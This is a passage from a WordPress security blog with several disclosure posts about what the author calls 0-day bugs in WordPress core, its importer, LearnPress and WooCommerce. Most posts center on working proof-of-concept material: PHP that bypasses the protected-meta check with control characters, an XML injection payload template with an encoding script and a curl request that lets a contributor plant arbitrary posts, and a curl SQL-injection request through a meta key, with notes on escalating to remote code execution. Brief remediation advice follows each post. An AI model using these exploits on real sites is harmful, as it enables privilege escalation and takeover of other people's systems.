							<a href="https://wpdeeply.com/wordpress-core-and-mysql-string-comparison/">July 25, 2020</a>
						</span>
					</li>
					
			</ul></div>

		
	</div>

</header><div class="post-inner thin ">

		<div class="entry-content">

			
<p>If we execute the following MySQL query against WP database</p>



<pre class="wp-block-code"><code lang="sql" class="language-sql">select * from wp_postmeta where meta_key = concat(char(1),"_wp_attached_file");
</code></pre>



<p>we will get results in case we had already uploaded media in the past</p>



<pre class="wp-block-code"><code class="">+---------+---------+-------------------+--------------------------------+
| meta_id | post_id | meta_key          | meta_value                     |
+---------+---------+-------------------+--------------------------------+
|      46 |      92 | _wp_attached_file | 2020/07/wpdeeply.png#/boom.png |
|      71 |      99 | _wp_attached_file | wpdeeply                       |
+---------+---------+-------------------+--------------------------------+
2 rows in set (0.00 sec)

</code></pre>



<p>This is sort of â€œfeatureâ€ of MySQL RDBMS, but what this means from WP aspect. It means a lot, because in the past there were account take over / backdoor vulnerabilities fixed silently and today we are going to focus onÂ <code>update_metadata</code>Â function. WordPress prevents medling with protected meta viaÂ <code>is_protected_meta</code>Â function which basically checks ifÂ <code>meta_key</code>Â starts withÂ <code>_</code>, but that isnâ€™t enough because it is on PHP side.</p>



<p>Eli5 PoC</p>



<p>Upload media file on your test WP instance and grab theÂ <code>post_id</code>. Then run the following code snippet with your own data / post_id:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">function bypass_protected_meta(){
    //your demo media(post) id
    $post_id = 99;
    
    $meta_key = "\x11_wp_attached_file";
    $meta_value = "wpdeeply";
    
    //into edit post meta capability there is check for protected meta, but this is for auditorium to be much more clearer 
    if ( current_user_can( 'edit_post_meta', $post_id, $meta_key ) && ! is_protected_meta($meta_key) ){
        update_post_meta($post_id, $meta_key, $meta_value);
    }
}

add_action(init, "bypass_protected_meta");
</code></pre>



<p>Refresh the media (will not be displayed) and if you check in DBÂ <code>_wp_attached_file</code>Â will have theÂ <code>wpdeeply</code>Â value. Is this bug with impact? Well Jetpack folks will need to answer thatÂ <a href="https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824">https://github.com/Automattic/jetpack/blob/master/json-endpoints/class.wpcom-json-api-update-post-v1-2-endpoint.php#L824</a>, but you can find a lot of use cases on wpdirectory ğŸ™‚</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-core-and-mysql-string-comparison.md#few-facts"></a>Few facts</h2>



<ul><li>This MySQL behaviour is for huge set of utf-8 characters not only ascii control ones</li><li>Why this <a rel="noreferrer noopener" href="https://stackoverflow.com/questions/543580/equals-vs-like/2336940#2336940" target="_blank">happens</a>Â </li><li>There are more places around WP code where unexpected behaviour is in game, because at the end of the day WP is just PHP & MySQL web app</li><li>Meddling with protected meta on WP is RCE. Few examples: <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank">here</a>, <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a> and <a rel="noreferrer noopener" href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank">here</a>. There are few not disclosed too ğŸ™‚</li></ul><h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-core-and-mysql-string-comparison.md#remediation"></a>Remediation</h2>



<ul><li>be careful with data used in MySQL WHERE</li><li><code>is_protected_meta</code>Â should be DB/MySQL check against current setup instead PHP one</li></ul></div>

	</div>

	<div class="section-inner">
		
		<div class="post-meta-wrapper post-meta-single post-meta-single-bottom">

			<ul class="post-meta"><li class="post-tags meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Tags</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 18 18"><path fill="" d="M15.4496399,8.42490555 L8.66109799,1.63636364 L1.63636364,1.63636364 L1.63636364,8.66081885 L8.42522727,15.44178 C8.57869221,15.5954158 8.78693789,15.6817418 9.00409091,15.6817418 C9.22124393,15.6817418 9.42948961,15.5954158 9.58327627,15.4414581 L15.4486339,9.57610048 C15.7651495,9.25692435 15.7649133,8.74206554 15.4496399,8.42490555 Z M16.6084423,10.7304545 L10.7406818,16.59822 C10.280287,17.0591273 9.65554997,17.3181054 9.00409091,17.3181054 C8.35263185,17.3181054 7.72789481,17.0591273 7.26815877,16.5988788 L0.239976954,9.57887876 C0.0863319284,9.4254126 0,9.21716044 0,9 L0,0.818181818 C0,0.366312477 0.366312477,0 0.818181818,0 L9,0 C9.21699531,0 9.42510306,0.0862010512 9.57854191,0.239639906 L16.6084423,7.26954545 C17.5601275,8.22691012 17.5601275,9.77308988 16.6084423,10.7304545 Z M5,6 C4.44771525,6 4,5.55228475 4,5 C4,4.44771525 4.44771525,4 5,4 C5.55228475,4 6,4.44771525 6,5 C6,5.55228475 5.55228475,6 5,6 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/tag/0day/" rel="tag">0day</a>						</span>
					</li>
					
			</ul></div>

		
	</div>

	
</article><hr class="post-separator styled-separator is-style-wide section-inner" aria-hidden="true"><article class="post-169 post type-post status-publish format-standard hentry category-core category-plugins tag-0day" id="post-169"><header class="entry-header has-text-align-center"><div class="entry-header-inner section-inner medium">

		
			<div class="entry-categories">
				<span class="screen-reader-text">Categories</span>
				<div class="entry-categories-inner">
					<a href="https://wpdeeply.com/category/core/" rel="category tag">core</a> <a href="https://wpdeeply.com/category/plugins/" rel="category tag">plugins</a>				</div>
			</div>

			<h2 class="entry-title heading-size-1"><a href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/">WordPress importer arbitrary post create</a></h2>
		<div class="post-meta-wrapper post-meta-single post-meta-single-top">

			<ul class="post-meta"><li class="post-author meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post author</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="20" viewbox="0 0 18 20"><path fill="" d="M18,19 C18,19.5522847 17.5522847,20 17,20 C16.4477153,20 16,19.5522847 16,19 L16,17 C16,15.3431458 14.6568542,14 13,14 L5,14 C3.34314575,14 2,15.3431458 2,17 L2,19 C2,19.5522847 1.55228475,20 1,20 C0.44771525,20 0,19.5522847 0,19 L0,17 C0,14.2385763 2.23857625,12 5,12 L13,12 C15.7614237,12 18,14.2385763 18,17 L18,19 Z M9,10 C6.23857625,10 4,7.76142375 4,5 C4,2.23857625 6.23857625,0 9,0 C11.7614237,0 14,2.23857625 14,5 C14,7.76142375 11.7614237,10 9,10 Z M9,8 C10.6568542,8 12,6.65685425 12,5 C12,3.34314575 10.6568542,2 9,2 C7.34314575,2 6,3.34314575 6,5 C6,6.65685425 7.34314575,8 9,8 Z"></path></svg></span>
						<span class="meta-text">
							By <a href="https://wpdeeply.com/author/root/">root</a>						</span>
					</li>
										<li class="post-date meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post date</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="19" viewbox="0 0 18 19"><path fill="" d="M4.60069444,4.09375 L3.25,4.09375 C2.47334957,4.09375 1.84375,4.72334957 1.84375,5.5 L1.84375,7.26736111 L16.15625,7.26736111 L16.15625,5.5 C16.15625,4.72334957 15.5266504,4.09375 14.75,4.09375 L13.3993056,4.09375 L13.3993056,4.55555556 C13.3993056,5.02154581 13.0215458,5.39930556 12.5555556,5.39930556 C12.0895653,5.39930556 11.7118056,5.02154581 11.7118056,4.55555556 L11.7118056,4.09375 L6.28819444,4.09375 L6.28819444,4.55555556 C6.28819444,5.02154581 5.9104347,5.39930556 5.44444444,5.39930556 C4.97845419,5.39930556 4.60069444,5.02154581 4.60069444,4.55555556 L4.60069444,4.09375 Z M6.28819444,2.40625 L11.7118056,2.40625 L11.7118056,1 C11.7118056,0.534009742 12.0895653,0.15625 12.5555556,0.15625 C13.0215458,0.15625 13.3993056,0.534009742 13.3993056,1 L13.3993056,2.40625 L14.75,2.40625 C16.4586309,2.40625 17.84375,3.79136906 17.84375,5.5 L17.84375,15.875 C17.84375,17.5836309 16.4586309,18.96875 14.75,18.96875 L3.25,18.96875 C1.54136906,18.96875 0.15625,17.5836309 0.15625,15.875 L0.15625,5.5 C0.15625,3.79136906 1.54136906,2.40625 3.25,2.40625 L4.60069444,2.40625 L4.60069444,1 C4.60069444,0.534009742 4.97845419,0.15625 5.44444444,0.15625 C5.9104347,0.15625 6.28819444,0.534009742 6.28819444,1 L6.28819444,2.40625 Z M1.84375,8.95486111 L1.84375,15.875 C1.84375,16.6516504 2.47334957,17.28125 3.25,17.28125 L14.75,17.28125 C15.5266504,17.28125 16.15625,16.6516504 16.15625,15.875 L16.15625,8.95486111 L1.84375,8.95486111 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/wordpress-importer-arbitrary-post-create/">July 23, 2020</a>
						</span>
					</li>
					
			</ul></div>

		
	</div>

</header><div class="post-inner thin ">

		<div class="entry-content">

			
<p>Native WordPress importer have 3 different parser classes:Â <code>WXR_Parser_SimpleXML</code>,Â <code>WXR_Parser_XML</code>Â andÂ <code>WXR_Parser_Regex</code>. If first two required PHP extensions (<code>simplexml</code>Â andÂ <code>xml</code>) arenâ€™t installed or somehow they fail during export file parsing, then everything should be done byÂ <code>WXR_Parser_Regex</code>Â class.</p>



<p>Failing could occure because:</p>



<ul><li>malformed XML file</li><li>Huge XML file with lot of data (libxml doesnâ€™t obay memory constraints from php.ini)</li><li>most important one: those extensions canâ€™t parse XML data that holds ascii control characters in it.</li></ul><p>In theÂ <code>WXR_Parser_Regex</code>Â we have following</p>



<pre class="wp-block-code"><code lang="php" class="language-php">foreach ( $multiline_tags as $tag => $handler ) {
	// Handle multi-line tags on a singular line
	if ( preg_match( '|<' . $tag . '>(.*?)</' . $tag . '>|is', $importline, $matches ) ) {
...
</code></pre>



<p>and this means that somewhere in the user input if there isÂ <br><code>< / item ></code>Â we talk about end of the post. We all know that meta / custom fields can hold anything, so we have our entry point. Fallback towardsÂ <code>WXR_Parser_Regex</code>Â checked and entry point checked, time for demo.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-arbitrary-post-create.md#eli5-poc"></a>Eli5 PoC</h2>



<p>On any WP instance log in withÂ <code>contributor</code>Â user role. Create blog post and add meta / custom field with following value ğŸ™‚ Template payload for meta value:</p>



<pre class="wp-block-code"><code lang="xml" class="language-xml"></wp:meta_value></wp:postmeta></item>
[asciicontrol]
<item>
<title>Attack-Post-1337</title>
<link>http://attack.post/2020/07/19/attack-post/</link>
<pubDate>Sun, 19 Jul 2020 20:57:17 +0000</pubDate>
<dc:creator>attacker</dc:creator>
<guid isPermaLink="false">http://attack.post?p=1337</guid>
<description></description>
<content:encoded><!-- wp:paragraph -->
<p>boom jee</p>
<!-- /wp:paragraph --></content:encoded>
<excerpt:encoded></excerpt:encoded>
<wp:post_id>1337</wp:post_id>
<wp:post_date>2020-07-19 20:57:17</wp:post_date>
<wp:post_date_gmt>2020-07-19 20:57:17</wp:post_date_gmt>
<wp:comment_status>open</wp:comment_status>
<wp:ping_status>open</wp:ping_status>
<wp:post_name>attack-post</wp:post_name>
<wp:status>publish</wp:status>
<wp:post_parent>0</wp:post_parent>
<wp:menu_order>0</wp:menu_order>
<wp:post_type>post</wp:post_type>
<wp:post_password></wp:post_password>
<wp:is_sticky>0</wp:is_sticky>
<category domain="category" nicename="uncategorized">Uncategorized</category>
<wp:postmeta>
<wp:meta_key>_test</wp:meta_key>
<wp:meta_value></code></pre>



<p>prepare this template payload on the following way</p>



<pre class="wp-block-code"><code lang="php" class="language-php">//grab the content
$cnt = file_get_contents("attack-template.txt");
//add ascii control characters
$cnt = str_replace("[asciicontrol]", "\x00\x01\x02\x08\x16", $cnt);
//url encode it and it is ready to be used towards any meta (custom) field as value
file_put_contents("final-payload.txt", urlencode($cnt));
</code></pre>



<p>and create the meta / custom field asÂ <code>contributor</code>.</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.target/wp-admin/admin-ajax.php' -H 'Cookie: ...' --data '_ajax_nonce=0&action=add-meta&metakeyselect=%23NONE%23&metakeyinput=wpdeeply&metavalue=[content_from_final-payload.txt]&_ajax_nonce-add-meta=61b457d48c&post_id=[your_post_id]' --compressed
</code></pre>



<p>Now log in asÂ <code>administrator</code>Â export the Posts and import them anywhere you want. Say hello to extra post of any type with any data created by Â <code>contributor</code>.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-arbitrary-post-create.md#few-facts"></a>Few facts</h2>



<ul><li>Many mainstream plugins accept raw user input in meta / custom fields</li><li>RCE could be achieved without user/attacker interaction when import occurs. <a href="https://wpdeeply.com/wordpress-null-byte-to-rce-0-day-bug/" target="_blank" rel="noreferrer noopener">Example 1</a> and <a href="https://wpdeeply.com/wordpress-write-image-to-any-directory-rce/" target="_blank" rel="noreferrer noopener">Example 2</a></li><li><a href="https://wpdeeply.com/wordpress-updates-from-core-and-security/" target="_blank" rel="noreferrer noopener">persistence</a> and <a href="https://github.com/Slavco/wp-weaver" target="_blank" rel="noreferrer noopener">stealth agents</a> planting is 100% option in WP</li></ul><h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-importer-arbitrary-post-create.md#remediation"></a>Remediation</h2>



<ul><li>Sign the posts / data exported and check the signature with data need to be imported</li><li>Follow 101 security practices for web applications</li></ul></div>

	</div>

	<div class="section-inner">
		
		<div class="post-meta-wrapper post-meta-single post-meta-single-bottom">

			<ul class="post-meta"><li class="post-tags meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Tags</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 18 18"><path fill="" d="M15.4496399,8.42490555 L8.66109799,1.63636364 L1.63636364,1.63636364 L1.63636364,8.66081885 L8.42522727,15.44178 C8.57869221,15.5954158 8.78693789,15.6817418 9.00409091,15.6817418 C9.22124393,15.6817418 9.42948961,15.5954158 9.58327627,15.4414581 L15.4486339,9.57610048 C15.7651495,9.25692435 15.7649133,8.74206554 15.4496399,8.42490555 Z M16.6084423,10.7304545 L10.7406818,16.59822 C10.280287,17.0591273 9.65554997,17.3181054 9.00409091,17.3181054 C8.35263185,17.3181054 7.72789481,17.0591273 7.26815877,16.5988788 L0.239976954,9.57887876 C0.0863319284,9.4254126 0,9.21716044 0,9 L0,0.818181818 C0,0.366312477 0.366312477,0 0.818181818,0 L9,0 C9.21699531,0 9.42510306,0.0862010512 9.57854191,0.239639906 L16.6084423,7.26954545 C17.5601275,8.22691012 17.5601275,9.77308988 16.6084423,10.7304545 Z M5,6 C4.44771525,6 4,5.55228475 4,5 C4,4.44771525 4.44771525,4 5,4 C5.55228475,4 6,4.44771525 6,5 C6,5.55228475 5.55228475,6 5,6 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/tag/0day/" rel="tag">0day</a>						</span>
					</li>
					
			</ul></div>

		
	</div>

	
</article><hr class="post-separator styled-separator is-style-wide section-inner" aria-hidden="true"><article class="post-167 post type-post status-publish format-standard hentry category-plugins tag-0day" id="post-167"><header class="entry-header has-text-align-center"><div class="entry-header-inner section-inner medium">

		
			<div class="entry-categories">
				<span class="screen-reader-text">Categories</span>
				<div class="entry-categories-inner">
					<a href="https://wpdeeply.com/category/plugins/" rel="category tag">plugins</a>				</div>
			</div>

			<h2 class="entry-title heading-size-1"><a href="https://wpdeeply.com/learnpress-sqli-to-rce/">LearnPress SQLi to RCE</a></h2>
		<div class="post-meta-wrapper post-meta-single post-meta-single-top">

			<ul class="post-meta"><li class="post-author meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post author</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="20" viewbox="0 0 18 20"><path fill="" d="M18,19 C18,19.5522847 17.5522847,20 17,20 C16.4477153,20 16,19.5522847 16,19 L16,17 C16,15.3431458 14.6568542,14 13,14 L5,14 C3.34314575,14 2,15.3431458 2,17 L2,19 C2,19.5522847 1.55228475,20 1,20 C0.44771525,20 0,19.5522847 0,19 L0,17 C0,14.2385763 2.23857625,12 5,12 L13,12 C15.7614237,12 18,14.2385763 18,17 L18,19 Z M9,10 C6.23857625,10 4,7.76142375 4,5 C4,2.23857625 6.23857625,0 9,0 C11.7614237,0 14,2.23857625 14,5 C14,7.76142375 11.7614237,10 9,10 Z M9,8 C10.6568542,8 12,6.65685425 12,5 C12,3.34314575 10.6568542,2 9,2 C7.34314575,2 6,3.34314575 6,5 C6,6.65685425 7.34314575,8 9,8 Z"></path></svg></span>
						<span class="meta-text">
							By <a href="https://wpdeeply.com/author/root/">root</a>						</span>
					</li>
										<li class="post-date meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post date</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="19" viewbox="0 0 18 19"><path fill="" d="M4.60069444,4.09375 L3.25,4.09375 C2.47334957,4.09375 1.84375,4.72334957 1.84375,5.5 L1.84375,7.26736111 L16.15625,7.26736111 L16.15625,5.5 C16.15625,4.72334957 15.5266504,4.09375 14.75,4.09375 L13.3993056,4.09375 L13.3993056,4.55555556 C13.3993056,5.02154581 13.0215458,5.39930556 12.5555556,5.39930556 C12.0895653,5.39930556 11.7118056,5.02154581 11.7118056,4.55555556 L11.7118056,4.09375 L6.28819444,4.09375 L6.28819444,4.55555556 C6.28819444,5.02154581 5.9104347,5.39930556 5.44444444,5.39930556 C4.97845419,5.39930556 4.60069444,5.02154581 4.60069444,4.55555556 L4.60069444,4.09375 Z M6.28819444,2.40625 L11.7118056,2.40625 L11.7118056,1 C11.7118056,0.534009742 12.0895653,0.15625 12.5555556,0.15625 C13.0215458,0.15625 13.3993056,0.534009742 13.3993056,1 L13.3993056,2.40625 L14.75,2.40625 C16.4586309,2.40625 17.84375,3.79136906 17.84375,5.5 L17.84375,15.875 C17.84375,17.5836309 16.4586309,18.96875 14.75,18.96875 L3.25,18.96875 C1.54136906,18.96875 0.15625,17.5836309 0.15625,15.875 L0.15625,5.5 C0.15625,3.79136906 1.54136906,2.40625 3.25,2.40625 L4.60069444,2.40625 L4.60069444,1 C4.60069444,0.534009742 4.97845419,0.15625 5.44444444,0.15625 C5.9104347,0.15625 6.28819444,0.534009742 6.28819444,1 L6.28819444,2.40625 Z M1.84375,8.95486111 L1.84375,15.875 C1.84375,16.6516504 2.47334957,17.28125 3.25,17.28125 L14.75,17.28125 C15.5266504,17.28125 16.15625,16.6516504 16.15625,15.875 L16.15625,8.95486111 L1.84375,8.95486111 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/learnpress-sqli-to-rce/">July 21, 2020</a>
						</span>
					</li>
					
			</ul></div>

		
	</div>

</header><div class="post-inner thin ">

		<div class="entry-content">

			
<p>Few months back <a href="https://research.checkpoint.com/2020/e-learning-platforms-getting-schooled-multiple-vulnerabilities-in-wordpress-most-popular-learning-management-system-plugins/" target="_blank" rel="noreferrer noopener">security research regarding WP learning platforms</a> got my attention. From writing there and change logs it was obvios that some of the SQLi vulnerabilities remained in the code and what is more interesting it is easy to be escalated to RCE.</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#eli5-poc"></a>Eli5 PoC</h2>



<p>Into functionÂ <code>learn_press_duplicate_post_meta</code>Â which is called fromÂ <code>learn_press_duplicate_post</code>Â we have the following:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">	function learn_press_duplicate_post_meta( $old_post_id, $new_post_id, $excerpt = array() ) {
		global $wpdb;
		$post_meta_infos = $wpdb->get_results( "SELECT meta_key, meta_value FROM $wpdb->postmeta WHERE post_id=$old_post_id" );
		if ( count( $post_meta_infos ) != 0 ) {
			$excerpt       = array_merge( array( '_edit_lock', '_edit_last' ), $excerpt );
			$excerpt       = apply_filters( 'learn_press_excerpt_duplicate_post_meta', $excerpt, $old_post_id, $new_post_id );
			$sql_query     = "INSERT INTO $wpdb->postmeta (post_id, meta_key, meta_value) ";
			$sql_query_sel = array();
			foreach ( $post_meta_infos as $meta ) {
				if ( in_array( $meta->meta_key, $excerpt ) ) {
					continue;
				}
				if ( $meta->meta_key === '_lp_course_author' ) {
					$meta->meta_value = get_current_user_id();
				}
				$meta_key        = $meta->meta_key;
				$meta_value      = addslashes( $meta->meta_value );
				$sql_query_sel[] = "SELECT $new_post_id, '$meta_key', '$meta_value'";
			}
			$sql_query .= implode( " UNION ALL ", $sql_query_sel );
			$wpdb->query( $sql_query );
		}
	}
</code></pre>



<p>From previous reportsÂ <code>$meta_value</code>Â was reported as SQLi vulnerable parameter, butÂ <code>$meta_key</code>Â wasnâ€™t?! Having on mind that we talk about WP then we all know that if we have permissions to edit post, then we have permissions to add custom fields (meta fields)</p>



<pre class="wp-block-code"><code lang="bash" class="language-bash">curl 'http://local.setup/wp-admin/admin-ajax.php' --data $'_ajax_nonce=0&action=add-meta&metakeyselect=%23NONE%23&metakeyinput=sqli\'payload&metavalue=anything&_ajax_nonce-add-meta=47cfdb164d&post_id=[lesson_id]'
</code></pre>



<p>In order to execute the SQLi and to be able to insert custom/meta field with any meta value, we need only to duplicate the lesson. Then we have the following ğŸ™‚</p>



<pre class="wp-block-code"><code class="">[Tue Jul 21 22:16:08.289659 2020] [:error] [pid 24069] [client ::1:47077] WordPress database error You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '', 'boom'' at line 1 for query INSERT INTO wp_postmeta (post_id, meta_key, meta_value) SELECT 107, 'count_items', '0' UNION ALL SELECT 107, '_lp_duration', '30 minute' UNION ALL SELECT 107, '_lp_preview', 'no' UNION ALL SELECT 107, 'boom'test', 'boom' made by require_once('wp-admin/admin.php')... LP_Lesson_CURD->duplicate, learn_press_duplicate_post, learn_press_duplicate_post_meta
</code></pre>



<p>What we can achieve with possibility to insert any meta value? Well that depends of plugin itself and WP setup. If we check the LearnPress code then we can notice following inÂ <code>learnpress.php</code>:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">require_once 'inc/class-lp-debug.php';
</code></pre>



<p>and this is important because:</p>



<pre class="wp-block-code"><code lang="php" class="language-php">public function __destruct() {
		if ( ! $this->_handles ) {
			return;
		}
		foreach ( $this->_handles as $handle ) {
			@fclose( $handle );
		}
	}
</code></pre>



<p>e.g. <a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/" target="_blank" rel="noreferrer noopener">same situation as WooCommerce</a> => hello RCE ğŸ™‚</p>



<h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#few-facts"></a>Few facts</h2>



<ul><li>I tried to warn researchers</li><li>Do not allow interesting gadget chains in your PHP code</li><li>Limit what could be unserialized in your php.ini</li></ul><h2><a href="https://github.com/Slavco/slavco.github.io/blob/master/start/wp-learn-press-audit.md#remediation"></a>Remediation</h2>



<ul><li>Do not allow SQLi in your code ğŸ™‚</li><li>Do not trust input</li></ul></div>

	</div>

	<div class="section-inner">
		
		<div class="post-meta-wrapper post-meta-single post-meta-single-bottom">

			<ul class="post-meta"><li class="post-tags meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Tags</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewbox="0 0 18 18"><path fill="" d="M15.4496399,8.42490555 L8.66109799,1.63636364 L1.63636364,1.63636364 L1.63636364,8.66081885 L8.42522727,15.44178 C8.57869221,15.5954158 8.78693789,15.6817418 9.00409091,15.6817418 C9.22124393,15.6817418 9.42948961,15.5954158 9.58327627,15.4414581 L15.4486339,9.57610048 C15.7651495,9.25692435 15.7649133,8.74206554 15.4496399,8.42490555 Z M16.6084423,10.7304545 L10.7406818,16.59822 C10.280287,17.0591273 9.65554997,17.3181054 9.00409091,17.3181054 C8.35263185,17.3181054 7.72789481,17.0591273 7.26815877,16.5988788 L0.239976954,9.57887876 C0.0863319284,9.4254126 0,9.21716044 0,9 L0,0.818181818 C0,0.366312477 0.366312477,0 0.818181818,0 L9,0 C9.21699531,0 9.42510306,0.0862010512 9.57854191,0.239639906 L16.6084423,7.26954545 C17.5601275,8.22691012 17.5601275,9.77308988 16.6084423,10.7304545 Z M5,6 C4.44771525,6 4,5.55228475 4,5 C4,4.44771525 4.44771525,4 5,4 C5.55228475,4 6,4.44771525 6,5 C6,5.55228475 5.55228475,6 5,6 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/tag/0day/" rel="tag">0day</a>						</span>
					</li>
					
			</ul></div>

		
	</div>

	
</article><hr class="post-separator styled-separator is-style-wide section-inner" aria-hidden="true"><article class="post-156 post type-post status-publish format-standard hentry category-plugins tag-0day" id="post-156"><header class="entry-header has-text-align-center"><div class="entry-header-inner section-inner medium">

		
			<div class="entry-categories">
				<span class="screen-reader-text">Categories</span>
				<div class="entry-categories-inner">
					<a href="https://wpdeeply.com/category/plugins/" rel="category tag">plugins</a>				</div>
			</div>

			<h2 class="entry-title heading-size-1"><a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/">WooCommerce MySQL replace to RCE</a></h2>
		<div class="post-meta-wrapper post-meta-single post-meta-single-top">

			<ul class="post-meta"><li class="post-author meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post author</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="20" viewbox="0 0 18 20"><path fill="" d="M18,19 C18,19.5522847 17.5522847,20 17,20 C16.4477153,20 16,19.5522847 16,19 L16,17 C16,15.3431458 14.6568542,14 13,14 L5,14 C3.34314575,14 2,15.3431458 2,17 L2,19 C2,19.5522847 1.55228475,20 1,20 C0.44771525,20 0,19.5522847 0,19 L0,17 C0,14.2385763 2.23857625,12 5,12 L13,12 C15.7614237,12 18,14.2385763 18,17 L18,19 Z M9,10 C6.23857625,10 4,7.76142375 4,5 C4,2.23857625 6.23857625,0 9,0 C11.7614237,0 14,2.23857625 14,5 C14,7.76142375 11.7614237,10 9,10 Z M9,8 C10.6568542,8 12,6.65685425 12,5 C12,3.34314575 10.6568542,2 9,2 C7.34314575,2 6,3.34314575 6,5 C6,6.65685425 7.34314575,8 9,8 Z"></path></svg></span>
						<span class="meta-text">
							By <a href="https://wpdeeply.com/author/root/">root</a>						</span>
					</li>
										<li class="post-date meta-wrapper">
						<span class="meta-icon">
							<span class="screen-reader-text">Post date</span>
							<svg class="svg-icon" aria-hidden="true" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" width="18" height="19" viewbox="0 0 18 19"><path fill="" d="M4.60069444,4.09375 L3.25,4.09375 C2.47334957,4.09375 1.84375,4.72334957 1.84375,5.5 L1.84375,7.26736111 L16.15625,7.26736111 L16.15625,5.5 C16.15625,4.72334957 15.5266504,4.09375 14.75,4.09375 L13.3993056,4.09375 L13.3993056,4.55555556 C13.3993056,5.02154581 13.0215458,5.39930556 12.5555556,5.39930556 C12.0895653,5.39930556 11.7118056,5.02154581 11.7118056,4.55555556 L11.7118056,4.09375 L6.28819444,4.09375 L6.28819444,4.55555556 C6.28819444,5.02154581 5.9104347,5.39930556 5.44444444,5.39930556 C4.97845419,5.39930556 4.60069444,5.02154581 4.60069444,4.55555556 L4.60069444,4.09375 Z M6.28819444,2.40625 L11.7118056,2.40625 L11.7118056,1 C11.7118056,0.534009742 12.0895653,0.15625 12.5555556,0.15625 C13.0215458,0.15625 13.3993056,0.534009742 13.3993056,1 L13.3993056,2.40625 L14.75,2.40625 C16.4586309,2.40625 17.84375,3.79136906 17.84375,5.5 L17.84375,15.875 C17.84375,17.5836309 16.4586309,18.96875 14.75,18.96875 L3.25,18.96875 C1.54136906,18.96875 0.15625,17.5836309 0.15625,15.875 L0.15625,5.5 C0.15625,3.79136906 1.54136906,2.40625 3.25,2.40625 L4.60069444,2.40625 L4.60069444,1 C4.60069444,0.534009742 4.97845419,0.15625 5.44444444,0.15625 C5.9104347,0.15625 6.28819444,0.534009742 6.28819444,1 L6.28819444,2.40625 Z M1.84375,8.95486111 L1.84375,15.875 C1.84375,16.6516504 2.47334957,17.28125 3.25,17.28125 L14.75,17.28125 C15.5266504,17.28125 16.15625,16.6516504 16.15625,15.875 L16.15625,8.95486111 L1.84375,8.95486111 Z"></path></svg></span>
						<span class="meta-text">
							<a href="https://wpdeeply.com/woocommerce-mysql-replace-to-rce/">July 18, 2020</a>
						</span>
					</li>
					
			</ul></div>

		
	</div>

</header><div class="post-inner thin ">

		<div class="entry-content">

			
<p>This bug is 0day, but same as this bug was reported in the past. Try to fix <a rel="noreferrer noopener" href="https://woocommerce.wordpress.com/2018/08/29/woocommerce-3-4-5-security-fix-release-notes/" target="_blank">here</a>Â and fix <a rel="noreferrer noopener" href="https://woocommerce.wordpress.com/2018/10/11/woocommerce-3-4-6-security-fix-release-notes/" target="_blank">here</a>. Anyway, in the Woo code there is <a rel="noreferrer noopener" href="https://github.com/woocommerce/woocommerce/blob/master/includes/class-wc-post-data.php#L169" target="_blank">another</a> DB query that modifies serialized PHP content outside from serialize / unserialize PHP functions and that results into user object injection. Beside numerous tries to harden WP, yet this bug is exploitable from contributor user role. See full exploitation via this video.</p>



